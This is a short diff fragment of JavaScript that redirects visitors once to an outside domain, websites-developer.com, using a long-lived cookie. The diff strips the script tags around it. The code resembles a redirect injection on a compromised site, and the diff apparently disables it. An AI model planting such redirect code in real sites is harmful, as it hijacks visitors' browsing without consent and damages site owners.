@@ -1,4 +1,3 @@
-<script type="text/javascript">
 function redirect(){
 var thecookie = readCookie('doRedirect');
 if(!thecookie){window.location = 'https://websites-developer.com';
@@ -28,4 +27,3 @@ if(!thecookie){window.location = 'https://websites-developer.com';
     redirect();
    createCookie('doRedirect','true','999');
 }
-</script>
